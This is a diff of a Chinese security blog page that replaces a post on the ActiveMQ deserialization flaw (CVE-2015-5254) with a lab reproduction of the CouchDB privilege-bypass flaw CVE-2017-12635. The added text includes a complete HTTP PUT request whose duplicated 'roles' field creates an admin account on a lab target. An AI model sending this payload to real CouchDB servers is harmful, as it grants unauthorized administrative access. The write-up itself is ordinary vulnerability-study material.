@@ -16,10 +16,10 @@
   
   
   
-    <meta name="description" content="ActiveMQ反序列化漏洞（CVE-2015-5254）
-漏洞原理：ActiveMQ是apache的一套消息中间件，支持java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏...">
+    <meta name="description" content="CouchDB 未授权访问漏洞CVE-2017-12635
+漏洞原理：Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Mee...">
   
-  <title>ActiveMQ反序列化漏洞（CVE-2015-5254） [ liu ]</title>
+  <title>CouchDB 未授权访问漏洞CVE-2017-12635 [ liu ]</title>
   
   
     <link rel="shortcut icon" href="/hollow.ico">
@@ -38,7 +38,8 @@
 <body>
 <div class="side-navigate hide-area">
   
-    <div class="item prev">
+  
+    <div class="item next">
       <a href="/2019/07/20/1 day/1/">
         <div class="item-icon"></div>
       </a>
@@ -46,7 +47,6 @@
         ActiveMQ反序列化漏洞（CVE-2015-5254）
       </div>
     </div>
-  
   
 </div>
 <div id="outer-container" class="hide-area">
@@ -121,7 +121,7 @@
   
 
   <article id="post">
-    <h1>ActiveMQ反序列化漏洞（CVE-2015-5254）</h1>
+    <h1>CouchDB 未授权访问漏洞CVE-2017-12635</h1>
     <p class="page-title-sub">
       <span id="post-title-date">Created at 2019-07-20</span>
       
@@ -135,22 +135,27 @@
       
         
         
-        <a href="/tags/ActiveMQ反序列化漏洞（CVE-2015-5254）/">ActiveMQ反序列化漏洞（CVE-2015-5254）</a>
+        <a href="/tags/CouchDB-未授权访问漏洞CVE-2017-12635/">CouchDB 未授权访问漏洞CVE-2017-12635</a>
       
       </span>
       
     </p>
     
-    <h1 id="ActiveMQ反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ反序列化漏洞（CVE-2015-5254）</h1><hr>
-<h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>ActiveMQ是apache的一套消息中间件，支持java消息服务、集群、Spring Framework等。<br>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。<br>这个漏洞会开启61616和8161这两个端口，其中61616是用来工作的端口；8161是WEb管理页面端口。<br>序列化是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入临时或持久性的存储区。以后，可以直接从存储区中读取或反序列化对象的状态，重新创建该对象。</p>
-<blockquote>
-<ul>
-<li>1、构造（可以使用ysoserial）可执行命令的序列化对象。</li>
-<li>2、作为一个消息，访问61616端口</li>
-<li>3、访问web管理页面，读取消息，触发漏洞</li>
-</ul>
-</blockquote>
-<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>靶机：192.168.199.120:8161<br><img src="https://note.youdao.com/yws/public/resource/271141d89559826e461b6e9d46f7f12f/xmlnote/WEBRESOURCEb4c07e7b66ce597ac0c7d3bb214797ff/10125" alt></p>
+    <h1 id="CouchDB-未授权访问漏洞CVE-2017-12635"><a href="#CouchDB-未授权访问漏洞CVE-2017-12635" class="headerlink" title="CouchDB 未授权访问漏洞CVE-2017-12635"></a>CouchDB 未授权访问漏洞CVE-2017-12635</h1><hr>
+<h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。<br>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。<br>&emsp;<br>影响版本：小于 1.7.0 以及 小于 2.1.1<br>&emsp;<br>&emsp;</p>
+<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>靶机：192.168.199.217:5984<br>攻击者：192.168.199.187</p>
+<ol>
+<li>首先访问一下靶机</li>
+</ol>
+<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCEf45c3400599f2f09e07226e216dcdb92/10574" alt><br>暴漏出couchdb的版本信息等<br>访问<a href="http://192.168.199.151:5984/_utils/" target="_blank" rel="noopener">http://192.168.199.151:5984/_utils/</a></p>
+<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCE98552849765d2332f033736b4f986735/10536" alt><br>选择登陆账户：admin，密码：password<br>登陆进去可以看到别人创建的用户密码等数据库<br>&emsp;<br>&emsp;</p>
+<ol start="2">
+<li>使用burpsuite进行抓包并修改请求内容</li>
+</ol>
+<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCE2862a7c922ecf79ad78aef5d3794b79d/10540" alt><br>修改请求为PUT并创建用户和密码，在user这个数据库中创建账号和密码<br>PUT /_users/org.couchdb.user:liupanpan HTTP/1.1<br>Host: 192.168.199.217:5984<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>If-Modified-Since: Sat, 02 Dec 2017 17:49:09 GMT<br>Connection: close<br>Content-Length: 108</p>
+<p>{<br>  “type”: “user”,<br>  “name”: “liupanpan”,<br>  “roles”: [“_admin”],<br>  “roles”: [],<br>  “password”: “lpp”<br>}</p>
+<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCEcd68ce1dc7a7c6f634e2f878eb78bd36/10559" alt><br>&emsp;<br>访问下图页面</p>
+<p><img src="https://note.youdao.com/yws/public/resource/8de016f049dfd295f1df4bb4be42a572/xmlnote/WEBRESOURCEb3ea1d14224d390a775ea0c7e872977c/10562" alt><br>发现创建成功<br>&emsp;<br>&emsp;</p>
 
   </article>
   <div class="random-toc-area">
@@ -158,18 +163,18 @@
   <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">Hide TOC</button>
   <div class="random-toc">
     <h2>Table of Content</h2>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ActiveMQ反序列化漏洞（CVE-2015-5254）"><span class="toc-text">ActiveMQ反序列化漏洞（CVE-2015-5254）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理："><span class="toc-text">漏洞原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现："><span class="toc-text">漏洞复现：</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CouchDB-未授权访问漏洞CVE-2017-12635"><span class="toc-text">CouchDB 未授权访问漏洞CVE-2017-12635</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理："><span class="toc-text">漏洞原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现："><span class="toc-text">漏洞复现：</span></a></li></ol></li></ol>
   </div>
 </div>
 
   
 <nav id="pagination">
   
-    <a href="/2019/07/20/1 day/1/" class="prev">&larr; Prev post ActiveMQ反序列化漏洞（CVE-2015-5254）</a>
-  
 
   
 
+  
+    <a href="/2019/07/20/1 day/1/" class="next">Next post ActiveMQ反序列化漏洞（CVE-2015-5254） &rarr;</a>
   
 </nav>
 
